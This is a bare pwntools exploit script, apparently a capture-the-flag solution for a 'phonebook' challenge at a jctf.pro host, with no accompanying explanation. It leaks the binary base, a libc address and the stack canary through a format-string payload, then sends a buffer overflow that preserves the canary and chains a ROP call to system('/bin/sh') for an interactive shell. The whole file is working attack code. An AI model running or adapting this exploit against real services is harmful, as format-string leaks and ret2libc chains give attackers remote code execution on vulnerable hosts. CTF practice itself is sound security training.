from pwn import *

HOST, PORT = "phonebook.nc.jctf.pro", "1337"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil("> ")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]

def trial(payload):

	ii(2)
	ii(payload)
	ii('a')

	ii(1)
	ii(0)
	r.recvuntil('entry: ')
	r.recvuntil('Name: ')
	data=r.recvuntil('\nNumber', drop=True)

	ii(3)
	r.sendlineafter(': ', '0')
	print hexdump(data)
	return data

data=[int(x,16) for x in trial('%11$p_%191$p_%189$p').split('_')]
print map(hex, data)
base=data[0]-0xeb8
libc=data[1]-0x20f8a
canary=data[2]
ii(2)
ii('a')
system=libc+0x43870
poprdi=libc+0x2094f
binsh=libc+0x17e026
ii('a'*(0x578-0x81)+p64(canary)+p64(0)+p64(poprdi)+p64(binsh)+p64(system))
ii(4)
r.interactive()
